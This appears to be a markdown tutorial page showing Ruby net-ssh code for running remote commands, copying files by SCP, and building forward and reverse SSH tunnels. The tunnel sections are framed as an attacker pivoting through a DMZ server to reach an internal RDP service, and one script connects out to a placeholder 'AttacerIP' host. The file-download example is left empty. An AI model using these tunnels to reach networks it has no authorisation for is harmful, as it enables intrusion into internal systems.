# SSH
Here we shows some SSH using ruby
we'll need to install net-ssh gem for that

```
gem install net-ssh
```


## Simple SSH client
This is a very basic ssh client which sends and executes commands on a remote system 
```ruby
require 'net/ssh'

@hostname = "localhost"
@username = "root"
@password = "password"
@cmd = ARGV[0]

begin
  ssh = Net::SSH.start(@hostname, @username, :password => @password)
  res = ssh.exec!(@cmd)
  ssh.close
  puts res
rescue
  puts "Unable to connect to #{@hostname} using #{@username}/#{@password}"
end
```

more
https://gist.github.com/KINGSABRI/2860989

## SSH Tunneling




### Forward SSH Tunnel

```
                              |--------DMZ------|---Local Farm----|
                              |                 |                 |
|Attacker| ----SSH Tunnel---> | |SSH Server| <-RDP-> |Web server| |
                              |                 |                 |
                              |-----------------|-----------------|
```

Run ssh-ltnnel.rb on the **SSH Server** 

**ssh-ltunnel.rb**
```ruby
#!/usr/bin/evn ruby
require 'net/ssh'

Net::SSH.start("127.0.0.1", 'root', :password => '123132') do |ssh|

  ssh.forward.local('0.0.0.0', 3333, "WebServer", 3389)

  puts "[+] Starting SSH forward tunnel"
  ssh.loop { true }
end
```

Now connect to the **SSH Server** on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen

```
rdesktop WebServer:3333
```


### Reverse SSH Tunnel 
```
                              |--------DMZ------|---Local Farm----|
                              |                 |                 |
|Attacker| <---SSH Tunnel---- | |SSH Server| <-RDP-> |Web server| |
  |->-|                       |                 |                 |
                              |-----------------|-----------------|
```
Run ssh-rtnnel.rb on the **SSH Server** 

**ssh-rtunnel.rb**
```ruby
#!/usr/bin/evn ruby
require 'net/ssh'

Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|

  ssh.forward.remote_to(3389, 'WebServer', 3333, '0.0.0.0')
  
  puts "[+] Starting SSH reverse tunnel"
  ssh.loop { true }
end
```

Now SS from the **SSH Server** to **localhost** on the localhost's ssh port then  connect from your localhost to your localhost on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen

```
rdesktop localhost:3333
```



## Copy files via SSH (SCP)

- To install scp gem
```
gem install net-scp
```

- Upload file 

```ruby
require 'net/scp'


Net::SCP.upload!(
		 "SSHServer", 
                 "root",
                 "/home/KING/file.txt", "/root/", 
                 :ssh => { :password => "123123" }
                )
```

- Download file 

```ruby
```




<br><br><br>
---





